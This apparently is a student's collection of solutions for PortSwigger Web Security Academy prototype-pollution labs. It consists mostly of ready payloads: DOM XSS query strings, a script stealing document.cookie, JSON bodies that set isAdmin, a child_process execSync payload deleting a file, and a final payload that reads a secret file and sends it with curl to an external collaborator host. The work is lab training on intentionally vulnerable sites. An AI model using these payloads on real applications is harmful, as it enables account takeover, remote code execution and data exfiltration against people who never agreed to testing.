## Lab: DOM XSS via client-side prototype pollution

This lab is vulnerable to DOM XSS via client-side prototype pollution. To solve the lab:

1. Find a source that you can use to add arbitrary properties to the global `Object.prototype`.
    
2. Identify a gadget property that allows you to execute arbitrary JavaScript.
    
3. Combine these to call `alert()`.
    

You can solve this lab manually in your browser, or use DOM Invader to help you.

```plaintext
/?__proto__[transport_url]=data:javascript,alert(1)
```

## Lab: DOM XSS via an alternative prototype pollution vector

This lab is vulnerable to DOM XSS via client-side prototype pollution. To solve the lab:

1. Find a source that you can use to add arbitrary properties to the global `Object.prototype`.
    
2. Identify a gadget property that allows you to execute arbitrary JavaScript.
    
3. Combine these to call `alert()`.
    

You can solve this lab manually in your browser, or use DOM Invader to help you.

```plaintext
/?__proto__.sequence=alert(1)-
/?__proto__.sequence=alert(1)*
```

## Lab: Client-side prototype pollution via flawed sanitization

This lab is vulnerable to DOM XSS via client-side prototype pollution. Although the developers have implemented measures to prevent prototype pollution, these can be easily bypassed.

To solve the lab:

1. Find a source that you can use to add arbitrary properties to the global `Object.prototype`.
    
2. Identify a gadget property that allows you to execute arbitrary JavaScript.
    
3. Combine these to call `alert()`.

```plaintext
Solution:

/?__pro__proto__to__[transport_url]=data:javascript,alert(1)
```


## Lab: Client-side prototype pollution in third-party libraries

```plaintext
Use the DOM Invader to detect the gadget to inject then change the body

<script>document.location="https://0a78003803bd337980ea4a4900f50098.web-security-academy.net/#__proto__[hitCallback]=alert(document.cookie);"</script>

And send
```

## Lab: Privilege escalation via server-side prototype pollution

Add prototype in change-address function

```http
POST /my-account/change-address HTTP/2
Host: 0a6600f70451a9d0811925ce00e20064.web-security-academy.net
Cookie: session=7NmBssOUD6b1p3OjEo3866RKVofORTuB
Content-Length: 202
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Content-Type: application/json;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: */*
Origin: https://0a6600f70451a9d0811925ce00e20064.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a6600f70451a9d0811925ce00e20064.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{"address_line_1":"Wiener HQ1","address_line_2":"One Wiener Way1","city":"Wienerville1","postcode":"BU1 1RP1","country":"UK1","sessionId":"7NmBssOUD6b1p3OjEo3866RKVofORTuB","__proto__":{"isAdmin":true}}
```

## Lab: Detecting server-side prototype pollution without polluted property reflection


```json

{"address_line_1":"Wiener HQ1","address_line_2":"One Wiener Way1","city":"Wienerville1","postcode":"BU1 1RP1","country":"UK1","sessionId":"mKL9dfqwFb82uWrwbu61KuoMSQhgPovI","__proto__":{"status":544}}
```

Then trigger Error by breaking json

## Lab: Bypassing flawed input filters for server-side prototype pollution

This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object.

To solve the lab:

1. Find a prototype pollution source that you can use to add arbitrary properties to the global `Object.prototype`.
2. Identify a gadget property that you can use to escalate your privileges.
3. Access the admin panel and delete the user `carlos`.

You can log in to your own account with the following credentials: `wiener:peter`

#### Note

When testing for server-side prototype pollution, it's possible to break application functionality or even bring down the server completely. If this happens to your lab, you can manually restart the server using the button provided in the lab banner. Remember that you're unlikely to have this option when testing real websites, so you should always use caution.

```plaintext
Solution:

Bypass the __proto__ by using the constructor.prototype


{"address_line_1":"Wiener HQ1","address_line_2":"One Wiener Way1","city":"Wienerville1","postcode":"BU1 1RP1","country":"UK1","sessionId":"Abg6SfcIy1MXstQYiG6H6ShR4Ua88hsX","constructor":{"prototype":{"isAdmin":true}}}
```


## Lab: Remote code execution via server-side prototype pollution

This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object.

Due to the configuration of the server, it's possible to pollute `Object.prototype` in such a way that you can inject arbitrary system commands that are subsequently executed on the server.

To solve the lab:

1. Find a prototype pollution source that you can use to add arbitrary properties to the global `Object.prototype`.
2. Identify a gadget that you can use to inject and execute arbitrary system commands.
3. Trigger remote execution of a command that deletes the file `/home/carlos/morale.txt`.

In this lab, you already have escalated privileges, giving you access to admin functionality. You can log in to your own account with the following credentials: `wiener:peter`

```plaintex
Solution:

We can check that the change-address can be Prototype Poluttion.
Try to RCE with


{
	"address_line_1":"Wiener HQ1",
	"address_line_2":"One Wiener Way1",
	"city":"Wienerville1",
	"postcode":"BU1 1RP1",
	"country":"UK1",
	"sessionId":"u6oLwjAfk78zfrDswU9J3tbyHBKNBPk6",
	"__proto__":{
		"execArgv":[
			"--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
		]
	}
}
```

# Lab: Exfiltrating sensitive data via server-side prototype pollution

```plaintext
Exploit through the input and shell

POST /my-account/change-address HTTP/2
Host: 0ad7005e031c05a680381c5500fa0038.web-security-academy.net
Cookie: session=92WPrYPgxCpHtf1q7svmCe0AYe8Xp2je
Content-Length: 312
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Content-Type: application/json;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: */*
Origin: https://0ad7005e031c05a680381c5500fa0038.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ad7005e031c05a680381c5500fa0038.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{"address_line_1":"Wiener HQ1","address_line_2":"One Wiener Way1","city":"Wienerville1","postcode":"BU1 1RP1","country":"UK1","sessionId":"92WPrYPgxCpHtf1q7svmCe0AYe8Xp2je","__proto__":{"shell":"vim","input":":! cat /home/carlos/secret|base64| curl -d @- http://vxwhbdjkx4rcc0ly924xknuhc8iz6uuj.oastify.com \n"}}
```

